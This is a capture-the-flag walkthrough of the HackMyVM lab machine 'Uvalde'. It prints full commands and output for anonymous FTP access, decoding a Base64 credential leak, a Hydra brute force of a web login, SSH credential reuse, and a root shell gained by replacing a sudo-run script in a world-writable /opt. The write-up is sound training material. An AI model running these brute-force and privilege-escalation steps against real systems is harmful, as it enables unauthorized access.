# Uvalde

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Uvalde | cromiphi | Beginner | HackMyVM |

**Summary:** Uvalde is a beginner-level HackMyVM machine running Debian Linux. The attack begins with an anonymous FTP login that leaks a recorded terminal session (`output`) for the user `matthew`, revealing that the machine hosts a web application. Web enumeration uncovers a `create_account.php` endpoint; intercepting the registration response in browser DevTools exposes a Base64-encoded credential string in the redirect URL, which reveals the site's password pattern: `[username][year]@[NNNN]`. Using this pattern and Hydra, the password for `matthew` is brute-forced against the web login form and subsequently reused for SSH access. Once on the box, `sudo -l` reveals that `matthew` may run `/bin/bash /opt/superhack` as root without a password. Because the `/opt` directory is world-writable, the original `superhack` script is deleted and replaced with `/bin/bash`, spawning a root shell and yielding both flags.

---

## Reconnaissance

### Host Discovery

The target was identified on the local network using a custom PowerShell network-scanning script.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.126 08:00:27:35:41:53 VirtualBox
```

### Port Scanning

A full TCP scan with service and version detection was run against `192.168.100.126`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/uvalde]
└─$ nmap -sC -sV -p- -T4 192.168.100.126
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-24 18:52 WIB
Nmap scan report for 192.168.100.126
Host is up (0.0023s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000         5154 Jan 28  2023 output
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.100.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 3a:09:a4:da:d7:db:99:ee:a5:51:05:e9:af:e7:08:90 (RSA)
|   256 cb:42:6a:be:22:13:2c:f2:57:f9:80:d1:f7:fb:88:5c (ECDSA)
|_  256 44:3c:b4:0f:aa:c3:94:fa:23:15:19:e3:e5:18:56:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Agency - Start Bootstrap Theme
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.75 seconds
```

Three ports are open: **FTP (21)** with anonymous login enabled, **SSH (22)**, and **HTTP (80)** running Apache 2.4.54.

---

## Initial Access

### FTP — Anonymous Login & Information Disclosure

Nmap immediately flagged anonymous FTP access and a single file named `output`. Connecting and retrieving it revealed a `script(1)` terminal recording of the user `matthew`'s session.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/uvalde]
└─$ ftp 192.168.100.126
Connected to 192.168.100.126.
220 (vsFTPd 3.0.3)
Name (192.168.100.126:ouba): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||25477|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        116          4096 Jan 28  2023 .
drwxr-xr-x    2 0        116          4096 Jan 28  2023 ..
-rw-r--r--    1 1000     1000         5154 Jan 28  2023 output
226 Directory send OK.
ftp> get output
local: output remote: output
229 Entering Extended Passive Mode (|||32553|)
150 Opening BINARY mode data connection for output (5154 bytes).
100% |*****************************|  5154      813.11 KiB/s    00:00 ETA
226 Transfer complete.
5154 bytes received in 00:00 (639.21 KiB/s)
ftp> bye
221 Goodbye.

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/uvalde]
└─$ cat output
Script démarré sur 2023-01-28 19:54:05+01:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="105" LINES="25"]
matthew@debian:~$ id
uid=1000(matthew) gid=1000(matthew) groupes=1000(matthew)
matthew@debian:~$ ls -al
total 32
drwxr-xr-x 4 matthew matthew 4096 28 janv. 19:54 .
drwxr-xr-x 3 root    root    4096 23 janv. 07:52 ..
lrwxrwxrwx 1 root    root       9 23 janv. 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 matthew matthew  220 23 janv. 07:51 .bash_logout
-rw-r--r-- 1 matthew matthew 3526 23 janv. 07:51 .bashrc
drwx------ 3 matthew matthew 4096 23 janv. 08:04 .config
drwxr-xr-x 3 matthew matthew 4096 23 janv. 08:04 .local
-rw-r--r-- 1 matthew matthew  807 23 janv. 07:51 .profile
-rw-r--r-- 1 matthew matthew    0 28 janv. 19:54 typescript
-rwx------ 1 matthew matthew   33 23 janv. 07:53 user.txt
matthew@debian:~$ exit
exit

Script terminé sur 2023-01-28 19:54:37+01:00 [COMMAND_EXIT_CODE="0"]

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/uvalde]
└─$ file output
output: Unicode text, UTF-8 text, with very long lines (328), with CRLF, CR, LF line terminators, with escape sequences, with overstriking
```

Key intelligence extracted from this file:
- A valid local username: **`matthew`** (UID 1000).
- A `user.txt` flag exists in his home directory.
- The machine hostname at the time of recording was `debian`; the live hostname is `uvalde.hmv`.

### HTTP — Web Application Enumeration

Browsing to port 80 reveals a Bootstrap "Agency" theme landing page served by Apache 2.4.54.

![](image.png)

Directory brute-forcing with Feroxbuster uncovered several interesting endpoints, most notably `login.php`, `user.php` (which redirects to `login.php`), and `create_account.php`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/uvalde]
└─$ feroxbuster -u http://192.168.100.126/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,js,css,zip,bak,pem,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.126/
 🚩  In-Scope Url          │ 192.168.100.126
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, js, css, zip, bak, pem, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      714l     2076w    29604c http://192.168.100.126/index.php
302      GET        0l        0w        0c http://192.168.100.126/user.php => login.php
301      GET        9l       28w      317c http://192.168.100.126/mail => http://192.168.100.126/mail/
200      GET        1l        3w       22c http://192.168.100.126/mail/contact_me.php
200      GET       60l      103w     1022c http://192.168.100.126/login.php
200      GET       47l       95w     1003c http://192.168.100.126/create_account.php
[... truncated for brevity ...]
```

### Credential Pattern Discovery via Base64 Leak

Registering a test account at `create_account.php` and inspecting the browser's DevTools **Network** tab revealed a critical information leak: upon successful registration, the server redirected to `success.php` with a Base64-encoded query parameter containing the credentials in plaintext.

![](image-1.png)

The redirect URL contained: `success.php?dXNlcm5hbWU9Z29vZCZwYXNzd29yZD1nb29kMjAyNkA1Njc2`

Decoding the parameter exposed the password structure:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/uvalde]
└─$ echo "dXNlcm5hbWU9Z29vZCZwYXNzd29yZD1nb29kMjAyNkA1Njc2" | base64 -d
username=good&password=good2026@5676
```

The decoded string reveals the password formula: **`[username][year]@[4-digit-number]`**. Since the machine was created in 2023, the password for `matthew` would follow the pattern `matthew2023@NNNN`.

### Brute-Forcing matthew's Password with Hydra

A targeted wordlist was generated for all 10,000 possible four-digit suffixes:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/uvalde]
└─$ for i in $(seq -w 0000 9999); do echo "matthew2023@$i"; done > matthew_pass.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/uvalde]
└─$ tail -n 5 matthew_pass.txt
matthew2023@9995
matthew2023@9996
matthew2023@9997
matthew2023@9998
matthew2023@9999
```

Hydra was then used to brute-force the web login form:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/uvalde]
└─$ hydra -l matthew -P matthew_pass.txt 192.168.100.126 http-post-form '/login.php:username=matthew&password=^PASS^:<input type="submit" value="Login">'
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-24 19:47:20
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task
[DATA] attacking http-post-form://192.168.100.126:80/login.php:username=matthew&password=^PASS^:<input type="submit" value="Login">
[80][http-post-form] host: 192.168.100.126   login: matthew   password: mat[REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-24 19:47:55
```

**Credentials found:** `matthew` / `mat[REDACTED]`

### SSH Login as matthew

The web credentials were reused for SSH, granting a shell on the target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/uvalde]
└─$ ssh matthew@192.168.100.126
The authenticity of host '192.168.100.126 (192.168.100.126)' can't be established.
ED25519 key fingerprint is: SHA256:S2tp/jV32/GtUP68f14Rac4/yZXhbMmyut+ZqO+ZOl4
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.126' (ED25519) to the known hosts.
matthew@192.168.100.126's password:
Linux uvalde.hmv 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64
...
matthew@uvalde:~$ id
uid=1000(matthew) gid=1000(matthew) groups=1000(matthew)
matthew@uvalde:~$ ls -la
total 32
drwxr-xr-x 4 matthew matthew 4096 Jan 31  2023 .
drwxr-xr-x 3 root    root    4096 Jan 31  2023 ..
lrwxrwxrwx 1 root    root       9 Jan 31  2023 .bash_history -> /dev/null
-rw-r--r-- 1 matthew matthew  220 Jan 31  2023 .bash_logout
-rw-r--r-- 1 matthew matthew 3526 Jan 31  2023 .bashrc
drwx------ 2 matthew matthew 4096 Feb  3  2023 .config
drwxr-xr-x 3 matthew matthew 4096 Jan 31  2023 .local
-rw-r--r-- 1 matthew matthew  807 Jan 31  2023 .profile
-rwx------ 1 matthew matthew   33 Jan 31  2023 user.txt
```

---

## Privilege Escalation

### sudo Misconfiguration — World-Writable /opt Directory

Checking sudo permissions revealed that `matthew` can execute `/bin/bash /opt/superhack` as root without a password:

```bash
matthew@uvalde:~$ sudo -l
Matching Defaults entries for matthew on uvalde:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User matthew may run the following commands on uvalde:
    (ALL : ALL) NOPASSWD: /bin/bash /opt/superhack
```

Inspecting the script itself showed it is a harmless cosmetic bash script that simulates a "hacking tool":

```bash
matthew@uvalde:~$ file /opt/superhack
/opt/superhack: Bourne-Again shell script, ASCII text executable
matthew@uvalde:~$ ls -la /opt/superhack
-rw-r--r-- 1 root root 1594 Jan 31  2023 /opt/superhack
matthew@uvalde:~$ cat /opt/superhack
#! /bin/bash
clear -x

GRAS=$(tput bold)
JAUNE=$(tput setaf 3)$GRAS
BLANC=$(tput setaf 7)$GRAS
BLEU=$(tput setaf 4)$GRAS
VERT=$(tput setaf 2)$GRAS
ROUGE=$(tput setaf 1)$GRAS
RESET=$(tput sgr0)

cat << EOL


 _______  __   __  _______  _______  ______    __   __  _______  _______  ___   _
|       ||  | |  ||       ||       ||    _ |  |  | |  ||   _   ||       ||   | | |
|  _____||  | |  ||    _  ||    ___||   | ||  |  |_|  ||  |_|  ||       ||   |_| |
| |_____ |  |_|  ||   |_| ||   |___ |   |_||_ |       ||       ||       ||      _|
|_____  ||       ||    ___||    ___||    __  ||       ||       ||      _||     |_
 _____| ||       ||   |    |   |___ |   |  | ||   _   ||   _   ||     |_ |    _  |
|_______||_______||___|    |_______||___|  |_||__| |__||__| |__||_______||___| |_|



EOL


printf "${BLANC}Tool:${RESET} ${BLEU}superHack${RESET}\n"
printf "${BLANC}Author:${RESET} ${BLEU}hackerman${RESET}\n"
printf "${BLANC}Version:${RESET} ${BLEU}1.0${RESET}\n"

printf "\n"

[[ $# -ne 0 ]] && echo -e "${BLEU}Usage:${RESET} $0 domain" && exit

while [ -z "$domain" ]; do
read -p "${VERT}domain to hack:${RESET} " domain
done

printf "\n"

n=50

string=""
for ((i=0; i<$n; i++))
do
string+="."
done

for ((i=0; i<$n; i++))
do
string="${string/./#}"
printf "${BLANC}Hacking progress...:${RESET} ${BLANC}[$string]${RESET}\r"
sleep .09
done

printf "\n"
printf "${JAUNE}Target $domain ====> PWNED${RESET}\n"
printf "${JAUNE}URL: https://$domain/*********************.php${RESET}\n"

echo -e "\n${ROUGE}Pay 0.000047 BTC to 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5 to unlock backdoor.${RESET}\n"
```

While the file itself is owned by root and not writable, checking the permissions of the `/opt` directory revealed a critical misconfiguration — it is **world-writable** (`drwx---rwx`):

```bash
matthew@uvalde:~$ ls -ld /opt
drwx---rwx 2 root root 4096 Feb  5  2023 /opt
```

This means `matthew` can **delete** the existing `superhack` file (despite its `644` permissions) because directory write permission controls file deletion, not the file's own permissions. The attack path is:

1. Remove the original `superhack` script from the world-writable `/opt`.
2. Write a new `superhack` containing `/bin/bash`.
3. Execute it via the `sudo` rule to get a root shell.

```bash
matthew@uvalde:/opt$ rm /opt/superhack
rm: remove write-protected regular file '/opt/superhack'? y
matthew@uvalde:/opt$ ls -la
total 8
drwx---rwx  2 root root 4096 Feb 24 13:56 .
drwxr-xr-x 18 root root 4096 Jan 22  2023 ..
matthew@uvalde:/opt$ echo "/bin/bash" > /opt/superhack
matthew@uvalde:/opt$ sudo /bin/bash /opt/superhack
root@uvalde:/opt# id
uid=0(root) gid=0(root) groups=0(root)
root@uvalde:/opt# whoami
root
root@uvalde:/opt# hostname
uvalde.hmv
```

### Flags

```bash
root@uvalde:/opt# cat /home/matthew/user.txt /root/root.txt
6e4[REDACTED]
59e[REDACTED]
```

**ROOTED!**

---

## Attack Chain Summary

1. **Reconnaissance**: Full TCP scan (`nmap -sC -sV -p- -T4`) identified three open ports: FTP (21) with anonymous access, SSH (22), and HTTP (80) running Apache 2.4.54.

2. **Vulnerability Discovery**: Anonymous FTP login exposed a `script(1)` terminal recording (`output`) leaking the local username `matthew`. Web enumeration with Feroxbuster discovered `create_account.php` and `login.php`. Registering a test account and intercepting the HTTP response in DevTools revealed a Base64-encoded query parameter in the redirect URL, exposing the application's password pattern: `[username][year]@[NNNN]`.

3. **Exploitation**: A 10,000-entry wordlist was generated following the discovered password pattern for year 2023. Hydra brute-forced the HTTP POST login form, cracking `matthew`'s password as `mat[REDACTED]`. The same credentials granted SSH access to the machine.

4. **Internal Enumeration**: `sudo -l` revealed that `matthew` could run `/bin/bash /opt/superhack` as `root` with no password (`NOPASSWD`). Inspecting `/opt/superhack` showed a harmless cosmetic bash script. Checking directory permissions on `/opt` revealed it was world-writable (`drwx---rwx`), a critical misconfiguration enabling file replacement attacks.

5. **Privilege Escalation**: Leveraging the world-writable `/opt` directory, the original `superhack` script was deleted and replaced with a single-line script containing `/bin/bash`. Executing it via the `sudo` rule immediately spawned a root shell, granting full system compromise and access to both `user.txt` and `root.txt`.
